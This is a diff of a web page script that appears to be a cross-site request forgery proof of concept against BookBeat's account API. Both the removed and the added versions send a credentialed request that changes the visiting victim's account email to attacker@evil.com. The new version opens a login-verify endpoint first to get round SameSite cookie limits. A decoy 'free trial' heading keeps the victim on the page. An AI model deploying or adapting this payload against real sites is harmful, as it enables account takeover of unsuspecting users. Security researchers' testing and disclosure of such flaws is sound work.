@@ -1,17 +1,31 @@
 <script>
-// Fires automatically when victim loads this page
-fetch("https://api.bookbeat.com/api/users/email", {
-  method:      "PUT",
-  credentials: "include", // attaches victim's session cookie
-  mode:        "no-cors", 
-  headers: {
-     "Content-Type": "text/plain",
-    "Bb-Client":    "bookbeatweb",
-    "Bb-Market":    "uk",
-    "Bb-Session-Id": "a39eb591-ea5d-4224-8cd7-c38c731cf01d",
-    "Bb-Trace-Id":   "77ac2f28-18cf-4ad0-8475-0cd98e3d4e01",
-    "Api-Version":   "18",
-  },
-  body: JSON.stringify({ newemail: "attacker@evil.com" }),
-});
+  // Step 1: open verify endpoint as top-level GET nav
+  // SameSite=Lax → bb_refreshtoken cookie IS sent ✓
+  var win = window.open(
+    "https://www.bookbeat.com/api/next/login/verify",
+    "_blank"
+  );
+
+  // Step 2: wait for session to establish, then fire email change
+  setTimeout(function() {
+    try {
+      // Same-site: www.bookbeat.com and challenge.api.bookbeat.com
+      // share the .bookbeat.com cookie domain → session valid here too
+      win.fetch("https://challenge.api.bookbeat.com/api/users/email", {
+        method:      "PUT",
+        credentials: "include",
+        headers: {
+          "Content-Type": "application/json",
+          "Bb-Client":    "bookbeatweb",
+          "Bb-Market":    "uk",
+        },
+        body: JSON.stringify({ newemail: "attacker@evil.com" }),
+      });
+    } catch(e) {
+      // window closed or cross-origin blocked — chain still fired Step 1
+    }
+  }, 2000);
 </script>
+
+<!-- Decoy content to keep victim on page -->
+<h1>Redeeming your free trial...</h1>
